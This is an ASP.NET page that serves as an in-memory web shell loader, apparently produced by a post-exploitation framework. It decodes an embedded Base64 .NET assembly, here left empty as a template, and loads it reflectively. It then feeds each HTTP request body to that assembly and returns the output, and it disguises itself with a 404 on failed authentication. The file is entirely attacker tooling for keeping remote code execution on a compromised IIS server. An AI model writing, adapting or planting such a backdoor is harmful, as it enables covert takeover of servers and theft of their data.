<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    private const string CoreTypeName = "dotnet_core.NoOneCore";

    private static readonly object CoreLock = new object();
    private static volatile object cachedCore;

    private static readonly string CoreDllBase64 = @"
".Replace("\r", string.Empty).Replace("\n", string.Empty);

    protected void Page_Load(object sender, EventArgs e)
    {
        Response.TrySkipIisCustomErrors = true;

        if (!IsAuthed())
        {
            Response.Clear();
            Response.StatusCode = 404;
            return;
        }

        try
        {
            object noOneCore = GetOrInitCore();
            byte[] rawBody = ReadAllBytes(Request.InputStream);
            byte[] payload = TransformReqPayload(GetArgFromContent(rawBody));

            byte[] result;
            using (MemoryStream output = new MemoryStream())
            {
                noOneCore.Equals(new object[] { payload, output });
                result = output.ToArray();
            }

            byte[] responseBytes = WrapResData(TransformResData(result));

            Response.Clear();
            WrapResponse();
            Response.BinaryWrite(responseBytes);
        }
        catch (Exception ex)
        {
            try
            {
                Response.Clear();
                Response.TrySkipIisCustomErrors = true;
                Response.StatusCode = 200;
                Response.ContentType = "text/plain; charset=utf-8";
                Response.Write(ex.ToString());
            }
            catch { }
        }
    }

    private object GetOrInitCore()
    {
        object core = cachedCore;
        if (core != null)
        {
            return core;
        }

        lock (CoreLock)
        {
            if (cachedCore == null)
            {
                byte[] assemblyBytes = Convert.FromBase64String(CoreDllBase64);
                Assembly assembly = Assembly.Load(assemblyBytes);
                Type coreType = assembly.GetType(CoreTypeName, true);
                cachedCore = Activator.CreateInstance(coreType);
            }

            return cachedCore;
        }
    }

    private static byte[] ReadAllBytes(Stream input)
    {
        using (MemoryStream output = new MemoryStream())
        {
            byte[] buffer = new byte[4096];
            int read;
            while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
            {
                output.Write(buffer, 0, read);
            }
            return output.ToArray();
        }
    }

    private bool IsAuthed()
    {
        return true;
    }

    private byte[] GetArgFromContent(byte[] content)
    {
        return content;
    }

    private byte[] TransformReqPayload(byte[] payload)
    {
        return payload;
    }

    private byte[] TransformResData(byte[] input)
    {
        return input;
    }

    private byte[] WrapResData(byte[] data)
    {
        return data;
    }

    private void WrapResponse()
    {
    }
</script>
